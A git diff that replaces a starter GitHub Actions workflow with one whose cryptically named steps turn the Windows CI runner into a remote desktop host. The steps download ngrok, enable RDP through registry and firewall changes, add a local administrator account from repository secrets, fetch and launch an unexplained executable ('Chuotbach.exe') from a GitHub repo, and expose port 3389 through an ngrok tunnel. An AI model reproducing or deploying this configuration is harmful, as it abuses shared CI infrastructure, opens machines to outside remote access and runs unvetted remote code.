@@ -1,36 +1,41 @@
-# This is a basic workflow to help you get started with Actions
+name: MAY3
 
-name: CI
-
-# Controls when the workflow will run
 on:
-  # Triggers the workflow on push or pull request events but only for the "main" branch
   push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-
-  # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
 
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
-  # This workflow contains a single job called "build"
   build:
-    # The type of runner that the job will run on
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
 
-    # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v4
-
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
-
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
-        run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+    - name: MA
+      run: Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile ngrok.zip
+    - name: Yi
+      run: Expand-Archive ngrok.zip -DestinationPath .
+    - name: M6
+      env:
+        NO: ${{ secrets.NO }}
+      run: .\ngrok.exe authtoken "$Env:NO"
+    - name: MA3
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+    - name: MA1
+      run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    - name: LU2
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
+    - name: YAA
+      shell: pwsh
+      env:
+        PL: ${{ secrets.PL }}
+        EA: ${{ secrets.EA }}
+      run: |
+        New-LocalUser -Name "$Env:PL" -Password (ConvertTo-SecureString -AsPlainText "$Env:EA" -Force) -ErrorAction SilentlyContinue
+        Set-LocalUser -Name "$Env:PL" -Password (ConvertTo-SecureString -AsPlainText "$Env:EA" -Force)
+        Add-LocalGroupMember -Group "Administrators" -Member "$Env:PL"
+    - name: TA
+      run: |
+        Invoke-WebRequest https://github.com/lyntnt/may03/raw/refs/heads/main/.github/workflows/Chuotbach.zip -OutFile Chuotbach.zip   
+        Expand-Archive Chuotbach.zip -DestinationPath D:\Chuotbach
+        Start-Process D:\Chuotbach\Chuotbach.exe
+    - name: OK
+      run: .\ngrok.exe tcp 3389 --region=us-cal-1
